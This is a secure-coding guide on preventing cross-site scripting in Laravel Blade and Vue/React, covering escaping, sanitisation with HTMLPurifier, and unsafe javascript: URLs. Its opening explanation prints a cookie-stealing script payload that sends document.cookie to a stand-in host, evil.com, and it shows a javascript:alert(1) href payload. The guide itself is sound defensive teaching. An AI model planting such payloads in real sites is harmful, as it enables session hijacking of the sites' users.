# 🔐 01 - XSS Prevention (Cross-Site Scripting)

### 🧐 Explanation
Thinking: "I'll just trust what the user submits."
The Hack: `<script>fetch('http://evil.com/steal?cookies='+document.cookie)</script>`

As soon as another admin views this comment, their **Session Cookie is stolen**.
Boom. The hacker is now Admin.

---

### 💻 Defense 1: Automatic Escaping (Blade)

**Reference:** `{{ }}` vs `{!! !!}`

```php
// ✅ SAFE (Escapes HTML entities: < becomes &lt;)
{{ $comment->body }}

// ❌ DANGEROUS (Renders raw HTML/JS)
{!! $comment->body !!}
```

---

### 💻 Defense 2: Vue/React (v-html / dangerouslySetInnerHTML)

**Frontend Frameworks** also escape by default.
But be careful with WYSIWYG editors (Trix/Quill).

**❌ Bad (Vue):**
`<div v-html="comment.body"></div>`

**✅ Good (If you need Rich Text):**
If you MUST allow bold/italic:
1.  Use `strip_tags($body, '<b><i>')` in PHP before saving.
2.  Use **HTMLPurifier** package.

```bash
composer require mews/purifier
```

**Controller:**

```php
// Strips <script>, <iframe onload="...">, keeping only safe tags
$clean_html = clean($request->input('body'));
Comment::create(['body' => $clean_html]);
```

---

### ✅ When to Use
1.  **Always**: Use `{{ }}`.
2.  **HTMLPurifier**: Mandatory for any input that allows HTML (Rich Text Editors for Blog Posts).

### ❌ When NOT to Use
1.  **Trusted Admin Input**: If only Super Admin can edit the "Footer HTML code", you might allow raw output. But warn them.

---

### 🎙 Interview Insight
**Q: "Can `{{ }}` protect against XSS in href attributes?"**
**A:** "No! `{{ }}` protects against HTML structure injection.
But `<a href="{{ $url }}">Click</a>` is vulnerable if `$url` is `javascript:alert(1)`.
Blade escapes characters, but `javascript:` protocol is valid in `href`.
Always validate URLs with `filter_var($url, FILTER_VALIDATE_URL)` or ensure it starts with `http`."
